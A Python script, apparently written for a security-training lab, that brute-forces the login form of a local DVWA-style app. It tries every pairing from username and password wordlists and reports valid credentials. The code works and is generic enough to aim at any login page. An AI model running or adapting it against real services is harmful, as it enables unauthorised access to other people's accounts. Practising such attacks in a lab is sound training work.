import requests
import time


# url del formulario

URL = "http://127.0.0.1:8000/vulnerabilities/brute/"

# cabeceras para cookie
HEADERS = {
    "Cookie": "PHPSESSID=4oqcjkbufmsi5uknpgldb1h515; security=low"
}

# diccionarios
ARCHIVO_USUARIOS = "usuarios.txt"
ARCHIVO_PASSWORDS = "contraseñas.txt"

MENSAJE_FALLO = "Username and/or password incorrect."

def cargar_diccionario(ruta_archivo):
    try:
        with open(ruta_archivo, 'r', encoding='utf-8') as archivo:
            return [linea.strip() for linea in archivo.readlines()]
    except FileNotFoundError:
        print(f"[!] Error: No se encontró el archivo {ruta_archivo}")
        return []

def iniciar_ataque():

    usuarios = cargar_diccionario(ARCHIVO_USUARIOS)
    passwords = cargar_diccionario(ARCHIVO_PASSWORDS)

    if not usuarios or not passwords:
        print("No se cargaron diccionarios")
        return

    pares_encontrados = 0
    tiempo_inicio = time.time()

    # bucles para probar cada combinación
    for usuario in usuarios:
        for password in passwords:
            # parametros GET que se enviarán en la url
            parametros = {
                "username": usuario,
                "password": password,
                "Login": "Login"
            }

            respuesta = requests.get(URL, params=parametros, headers=HEADERS)
            if MENSAJE_FALLO not in respuesta.text:
                print(f"Combinación Correcta: {usuario} y {password}")
                pares_encontrados += 1
            else:
                # Opcional: imprimir los intentos fallidos (puedes comentarlo para que no ensucie la consola)
                print(f"    Fallo: {usuario} y {password}")

    tiempo_fin = time.time()
    
    print(f"tiempo total en segundos: {round(tiempo_fin - tiempo_inicio, 2)}")
    print(f"Total de combinaciones válidas encontradas: {pares_encontrados}")

# Punto de entrada del script
if __name__ == "__main__":
    iniciar_ataque()